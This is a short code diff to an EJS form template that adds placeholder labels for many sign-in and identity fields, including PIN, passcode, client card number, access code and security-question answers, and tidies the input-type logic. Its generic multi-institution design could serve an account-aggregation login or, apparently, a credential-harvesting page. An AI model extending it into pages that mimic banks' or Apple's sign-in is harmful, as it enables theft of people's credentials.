@@ -1873,10 +1873,29 @@
       account_number: 'Account number',
       user_id: 'User ID',
       account_last4: 'Last 4 digits of account',
-      personal_id: 'Personal ID'
+      personal_id: 'Personal ID',
+      email_or_phone: 'Email or mobile number',
+      username_or_email: 'Mobile number, username or email',
+      username_email_phone: 'Phone, email, or username',
+      email_or_username: 'Email or username',
+      client_number: 'Client number',
+      client_card: 'Client card number',
+      customer_registration_number: 'Customer registration number',
+      access_code: 'Access code',
+      contract_number: 'Contract number',
+      branch: 'Branch',
+      account: 'Account number',
+      sub_account: 'Sub-account',
+      pin: 'PIN',
+      membership_number: 'Membership number',
+      passcode: 'Passcode',
+      surname: 'Surname',
+      answer1: 'Answer',
+      answer2: 'Answer',
+      answer3: 'Answer'
     } %>
     <% pageContent.fields.forEach(f => {
-      const type = f === 'password' ? 'password' : f === 'email' || f === 'apple_id' ? 'email' : f === 'phone' ? 'tel' : f === 'dob' ? 'date' : 'text';
+      const type = f === 'password' ? 'password' : (f === 'email' || f === 'apple_id') ? 'email' : (f === 'phone') ? 'tel' : f === 'dob' ? 'date' : 'text';
       const placeholder = PLACEHOLDERS[f] || f;
     %>
       <input type="<%= type %>" name="<%= f %>" placeholder="<%= placeholder %>" autocomplete="<%= f === 'password' ? 'current-password' : 'off' %>" required>
